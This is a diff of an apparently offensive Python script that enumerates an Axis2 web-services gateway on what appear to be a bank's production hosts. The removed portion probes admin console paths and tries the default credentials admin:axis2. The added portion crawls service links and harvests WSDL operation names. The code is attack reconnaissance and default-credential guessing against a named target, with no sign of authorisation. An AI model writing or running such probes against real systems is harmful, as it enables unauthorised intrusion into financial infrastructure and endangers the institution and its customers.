@@ -52,20 +52,16 @@ except Exception as e:
 
 
 
-print("== V8: AXIS2 ADMIN + SERVICE LIST ==")
-import base64 as b64mod
-# service list penuh
-s, b = req("GET", "https://apigw-prod.bankina.id/services/listServices", {"User-Agent": "Mozilla/5.0"})
-print("listServices:", s, b[:1500])
-# admin console
-for p in ["/axis2-admin/", "/axis2-admin/login", "/axis2-admin/listServices", "/axis2-web/"]:
-    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0"})
-    print("ADMIN " + p + " => " + str(s) + " " + b[:100])
-# default creds admin:axis2 (Basic auth)
-auth = "Basic " + b64mod.b64encode(b"admin:axis2").decode()
-for p in ["/axis2-admin/", "/axis2-admin/listServices", "/services/listServices"]:
-    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0", "Authorization": auth})
-    print("AUTH " + p + " => " + str(s) + " " + b[:150])
-# services di api.bankina.id (synapse)
-s, b = req("GET", "https://api.bankina.id/services/listServices", {"User-Agent": "Mozilla/5.0"})
-print("api.bankina.id listServices:", s, b[:600])
+print("== V9: AXIS2 SERVICES + WSDL ==")
+import re
+s, b = req("GET", "https://apigw-prod.bankina.id/services", {"User-Agent": "Mozilla/5.0"})
+print("SERVICES PAGE:", s, "len", len(b))
+links = re.findall(r'href="([^"]+)"', b)
+print("LINKS:", links[:40])
+for lk in links[:15]:
+    if lk.startswith("/") and "axis2" not in lk and "css" not in lk:
+        s2, b2 = req("GET", "https://apigw-prod.bankina.id" + lk + "?wsdl", {"User-Agent": "Mozilla/5.0"})
+        print("WSDL " + lk + " => " + str(s2) + " len " + str(len(b2)) + " | " + b2[:80])
+        if s2 == 200 and len(b2) > 100:
+            ops = re.findall(r'<wsdl:operation name="([^"]+)"', b2)
+            print("  OPERATIONS:", ops[:20])
